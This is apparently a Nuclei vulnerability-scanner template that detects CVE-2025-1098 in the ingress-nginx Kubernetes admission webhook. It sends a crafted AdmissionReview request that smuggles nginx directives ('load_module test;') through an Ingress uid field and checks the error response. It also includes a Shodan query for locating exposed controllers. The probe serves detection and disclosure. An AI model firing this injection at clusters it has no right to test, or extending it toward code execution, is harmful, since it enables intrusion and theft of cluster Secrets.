http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - AdmissionReview
    - load_module
    - directive is specified too late
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"\
    kind\": \"AdmissionReview\",\n  \"apiVersion\": \"admission.k8s.io/v1\",\n  \"\
    request\": {\n    \"uid\": \"{{string}}\",\n    \"kind\": {\n      \"group\":\
    \ \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"kind\": \"Ingress\"\
    \n    },\n    \"resource\": {\n      \"group\": \"networking.k8s.io\",\n     \
    \ \"version\": \"v1\",\n      \"resource\": \"ingresses\"\n    },\n    \"requestKind\"\
    : {\n      \"group\": \"networking.k8s.io\",\n      \"version\": \"v1\",\n   \
    \   \"kind\": \"Ingress\"\n    },\n    \"requestResource\": {\n      \"group\"\
    : \"networking.k8s.io\",\n      \"version\": \"v1\",\n      \"resource\": \"ingresses\"\
    \n    },\n    \"name\": \"minimal-ingress\",\n    \"namespace\": \"default\",\n\
    \    \"operation\": \"CREATE\",\n    \"userInfo\": {\n      \"uid\": \"{{string}}\"\
    \n    },\n    \"object\": {\n      \"kind\": \"Ingress\",\n      \"apiVersion\"\
    : \"networking.k8s.io/v1\",\n      \"metadata\": {\n        \"name\": \"minimal-ingress\"\
    ,\n        \"namespace\": \"default\",\n        \"creationTimestamp\": null,\n\
    \        \"uid\": \"InjectTest#;\\n\\n}\\n}\\n}\\nload_module test;\",\n     \
    \   \"annotations\": {\n          \"nginx.ingress.kubernetes.io/mirror-target\"\
    : \"fake-mirror-target\"\n        }\n      },\n      \"spec\": {\n        \"ingressClassName\"\
    : \"nginx\",\n        \"rules\": [\n          {\n            \"host\": \"test.example.com\"\
    ,\n            \"http\": {\n              \"paths\": [\n                {\n  \
    \                \"path\": \"/\",\n                  \"pathType\": \"Prefix\"\
    ,\n                  \"backend\": {\n                    \"service\": {\n    \
    \                  \"name\": \"kubernetes\",\n                      \"port\":\
    \ {\n                        \"number\": 443\n                      }\n      \
    \              }\n                  }\n                }\n              ]\n  \
    \          }\n          }\n        ]\n      },\n      \"status\": {\n        \"\
    loadBalancer\": {}\n      }\n    },\n    \"oldObject\": null,\n    \"dryRun\"\
    : true,\n    \"options\": {\n      \"kind\": \"CreateOptions\",\n      \"apiVersion\"\
    : \"meta.k8s.io/v1\"\n    }\n  }\n}\n"
id: CVE-2025-1098
info:
  author: UNC1739
  classification:
    cve-id: CVE-2025-1098
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-20
    epss-percentile: 0.98194
    epss-score: 0.60565
  description: 'A security issue was discovered in  ingress-nginx https-//github.com/kubernetes/ingress-nginx  where
    the `mirror-target` and `mirror-host` Ingress annotations can be used to inject
    arbitrary configuration into nginx. This can lead to arbitrary code execution
    in the context of the ingress-nginx controller, and disclosure of Secrets accessible
    to the controller. (Note that in the default installation, the controller can
    access all Secrets cluster-wide.)

    '
  impact: 'Authenticated users with Ingress creation permissions can inject arbitrary
    nginx configuration through mirror annotations, leading to arbitrary code execution
    in the ingress-nginx controller context and disclosure of all Kubernetes Secrets
    cluster-wide.

    '
  metadata:
    max-request: 1
    shodan-query: ssl:"ingress-nginx" port:8443
    verified: true
  name: Ingress-Nginx Controller - Configuration Injection via Unsanitized Mirror
    Annotations
  reference:
  - https://github.com/kubernetes/kubernetes/issues/131008
  - https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
  - https://nvd.nist.gov/vuln/detail/CVE-2025-1098
  remediation: 'Upgrade to the patched version of ingress-nginx that properly sanitizes
    mirror-target and mirror-host annotations.

    '
  severity: high
  tags: cve,cve2025,cloud,devops,kubernetes,ingress,nginx,k8s,rce,vuln
variables:
  string: '{{to_lower(''{{randstr}}'')}}'
